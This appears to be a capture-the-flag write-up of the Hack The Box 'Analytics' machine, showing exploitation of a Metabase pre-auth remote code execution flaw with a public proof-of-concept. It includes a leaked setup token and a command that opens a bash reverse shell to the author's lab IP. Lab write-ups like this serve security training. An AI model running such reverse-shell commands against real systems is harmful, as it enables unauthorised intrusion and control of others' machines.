---
description: https://app.hackthebox.com/machines/Analytics
---

# 💢 Analytics

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

After some quick enumeration, we discover a web server  → after a quick look around, we arrive at a login page:

&#x20;

<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

a quick search reveals a RCE Pre auth with metabase: [https://github.com/m3m0o/metabase-pre-auth-rce-poc](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Let's look at the usage:

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

So we capture the request and change the get value in order to find the setup-token:

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

```
setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```

I tried triggering a whomai, but it is not intended to be used like that, more in an optic to do a reverse shell:

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

So I copy my ip address and then set up a listener:

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

```
python3 main.py -u http://analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.61/9898 0>&1"
```
